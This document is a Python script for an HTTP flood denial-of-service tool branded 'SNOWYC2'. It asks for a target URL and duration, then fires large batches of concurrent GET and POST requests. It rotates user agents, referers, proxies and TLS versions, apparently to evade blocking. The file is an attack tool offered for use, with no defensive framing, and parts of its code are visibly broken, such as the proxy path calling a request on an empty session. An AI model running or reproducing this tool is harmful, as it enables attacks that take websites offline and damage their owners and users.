import asyncio
import aiohttp
import ssl
import cloudscraper

from aiohttp import TCPConnector
from ssl import PROTOCOL_TLSv1_2, PROTOCOL_TLSv1_3

# Load UAs and Refs
def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

REFERERS = load_lines("refs.txt")
USER_AGENTS = load_lines("uas.txt")

# Hardcoded proxies
PROXIES = []
try:
    with open("STS.txt") as f:
        PROXIES = [line.strip() for line in f if line.strip()]
except:
    pass

USE_PROXIES = input("Proxy support? (y/n): ").lower() == 'y'

MAX_CONCURRENT = 50 if USE_PROXIES else 1000

# Toggle helpers
protocol_toggle = ["HTTP/1.1", "HTTP/2"]
tls_toggle = [PROTOCOL_TLSv1_2, PROTOCOL_TLSv1_3]
class_index = 0

class AttackEngine:
    def __init__(self, target, duration):
        self.target = target
        self.duration = duration
        self.start_time = asyncio.get_event_loop().time()
        self.total_requests = 0
        self.success = 0
        self.errors = 0

    async def send_request(self, session, proxy=None):
        global class_index

        headers = {
            "User-Agent": USER_AGENTS[self.total_requests % len(USER_AGENTS)],
            "Referer": REFERERS[self.total_requests % len(REFERERS)]
        }

        method = "GET" if self.total_requests % 2 == 0 else "POST"
        url = self.target
        self.total_requests += 1

        try:
            if proxy:
                async with session.request(method, url, headers=headers, proxy=f"http://{proxy}") as response:
                    if response.status == 200:
                        self.success += 1
                    else:
                        self.errors += 1
            else:
                proto = protocol_toggle[class_index % 2]
                tls_ver = tls_toggle[class_index % 2]
                class_index += 1

                ssl_ctx = ssl.SSLContext(tls_ver)
                conn = TCPConnector(ssl=ssl_ctx)

                async with aiohttp.ClientSession(connector=conn) as s:
                    async with s.request(method, url, headers=headers) as resp:
                        if resp.status == 200:
                            self.success += 1
                        else:
                            self.errors += 1
        except:
            self.errors += 1

    async def run(self):
        connector = TCPConnector(limit=None, ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)

        proxy_list = PROXIES if USE_PROXIES else [None]

        while asyncio.get_event_loop().time() - self.start_time < self.duration:
            tasks = []
            for _ in range(MAX_CONCURRENT):
                proxy = proxy_list[self.total_requests % len(proxy_list)] if USE_PROXIES else None
                tasks.append(self.send_request(None if proxy else None, proxy))

            await asyncio.gather(*tasks, return_exceptions=True)
            self.print_stats()

    def print_stats(self):
        print(f"[+][C-ECLIPSE] Sent: {self.total_requests} | Success: {self.success} | Errors: {self.errors}")

# Main
if __name__ == "__main__":
    print("SNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)

    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    duration = int(input("TIME (seconds): "))

    engine = AttackEngine(target, duration)
    try:
        asyncio.run(engine.run())
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        
